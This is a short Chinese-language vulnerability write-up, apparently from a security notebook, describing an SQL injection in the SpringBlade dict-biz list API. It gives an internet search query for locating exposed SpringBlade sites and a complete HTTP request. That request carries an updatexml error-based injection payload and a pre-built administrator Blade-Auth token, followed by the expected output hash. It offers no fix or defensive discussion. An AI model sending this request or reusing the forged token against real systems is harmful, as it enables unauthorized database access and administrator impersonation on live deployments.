# SpringBlade dict-biz存在SQL注入漏洞

# 一、漏洞简介
SpringBlade dict-biz存在SQL注入漏洞，攻击者利用该漏洞进行SQL注 入攻击

# 二、影响版本
+ SpringBlade

# 三、资产测绘
+ `<font style="color:rgb(63, 63, 63);">body="https://bladex.vip"</font>`

![1703260241729-c77ed022-a493-4621-983c-5ec64ddbde71.png](./img/eKNle2a8FR_4cOKY/1703260241729-c77ed022-a493-4621-983c-5ec64ddbde71-322685.png)

# 四、漏洞复现
```java
GET /api/blade-system/dict-biz/list?updatexml(1,concat(0x7e,md5(1),user(),0x7e),1)=1 HTTP/1.1
Host: 
Blade-Auth:	eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzUxMiJ9.eyJpc3MiOiJpc3N1c2VyIiwiYXVkIjoiYXVkaWVuY2UiLCJ0ZW5hbnRfaWQiOiIwMDAwMDAiLCJyb2xlX25hbWUiOiJhZG1pbmlzdHJhdG9yIiwidXNlcl9pZCI6IjExMjM1OTg4MjE3Mzg2NzUyMDEiLCJyb2xlX2lkIjoiMTEyMzU5ODgxNjczODY3NTIwMSIsInVzZXJfbmFtZSI6ImFkbWluIiwib2F1dGhfaWQiOiIiLCJ0b2tlbl90eXBlIjoiYWNjZXNzX3Rva2VuIiwiZGVwdF9pZCI6IjExMjM1OTg4MTM3Mzg2NzUyMDEiLCJhY2NvdW50IjoiYWRtaW4iLCJjbGllbnRfaWQiOiJzd29yZCIsImV4cCI6MTc5MTU3MzkyMiwibmJmIjoxNjkxNTcwMzIyfQ.wxB9etQp2DUL5d3-VkChwDCV3Kp-qxjvhIF_aD_beF_KLwUHV7ROuQeroayRCPWgOcmjsOVq6FWdvvyhlz9j7A
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br
```

![1713236352998-9826b36e-1662-4854-b88f-d07dc13498d5.png](./img/eKNle2a8FR_4cOKY/1713236352998-9826b36e-1662-4854-b88f-d07dc13498d5-184725.png)

```java
c4ca4238a0b923820dcc509a6f75849
```

sqlmap

```java

```



> 更新: 2024-12-13 17:10:57  
> 原文: <https://www.yuque.com/xiaokp7/ocvun2/wpz38hmzaeugpctm>